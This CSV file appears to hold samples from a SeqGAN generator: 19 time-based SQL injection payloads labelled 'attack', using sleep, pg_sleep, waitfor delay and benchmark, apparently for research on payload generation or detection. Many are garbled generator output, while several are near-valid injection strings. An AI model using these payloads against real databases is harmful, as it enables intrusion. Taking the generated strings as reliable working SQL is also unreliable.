label,payload,family,payload_type,method,run_id,sample_index
attack,select from or from   (    (  select sleep  (  5   )     )  sddmk8667  )  -- dkmdo  )rmq  )  v,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,0
attack,select sleep  (  sleep  (  5   )    )     )  sddo  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1
attack,1'   )    as dq  )    rlikkelt  (  0x544d5a4c   )    )     )  )   'yfvu')  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,2
attack,"1 and   (  select * from   (     (  select  (  5000000,md5  (  5   and    (    (     (  select 4240 from from from   (  select  (  select  ( sleep  (    (  5   )    (  select 4240 from pg_sleep  (  5   )     )    )    rldkmdo  )--",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,3
attack, 6969  =    rmq  )  and 6969  =    s kf  )    r from  =  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,4
attack," '0:0:5')    and 2388  =  6272,sleep  (  5  st  (  select '0:0:5'     )    (  select 4240 from from pg_sleep  (  ""zlal""  =  8667 or 8594  sleep  (  0x76555642   (  5   )    )     )   and ew  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,5
attack,1'  )   waitfor delay '0:05' and   (  '  0x4c4d6142   )    and    ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,6
attack,1 or 8514  =  benchmark  (  (  5   )    )     )  sddkmd5  )  sddor  )   and    (    ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,7
attack,"1%%""   )    )    rlike sleep  (  5  )   and    (    (   ""%0",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,8
attack,1 and 6969  =  sddo  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,9
attack,0x694a4745wkeh   (  5   )    (ddhco <> e # f yfs 8594  =  9008  6383 --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,10
attack,select 8514  md5  (  5   )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,11
attack,"1"" where '0:0:5'#",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,12
attack,1 or 4240  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,13
attack,"1'   )    )     )   and sleep  (  5  )   and    (    (     (  '   )    and emq   (  (  1210select sleep  (  sleep  (  5000000,  =  (  =  7279 and from   (  select   sleep  (  5   )    )     )  rnzcr  )   and    4240    (  select    (  select 8594 from '0:0:5' and    (  select * '0:0:5'(  select sleep  (  5000000,md5  (  5  )   where '0:0:2' from       (  select 6793  (  1210  =  benchmark  (  5   and e 4240 from 6969)   (  select * from   (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,14
attack,"1'  )   waitfor delay '0:0:5""awjd"" like ""%pr",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,15
attack," ""sd"" like ""crviq    ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,16
attack,1'+  (  select 'dkxikkfp,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,17
attack,)    (  select * from   (  select  (  (  sleep  (  5  )  (  0x544d5a4c   and    (    )     )  sdd5 and from e pg_sleep  (     (  5   )     )    (  select 4240 from pg_sleep  (  5   )  )   -- kfselect 6793 from pg_sleep  (  5   )    )    and    'wyvx'=    (    (  select 8594    =  (  select from   (  8507 ruv,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,18
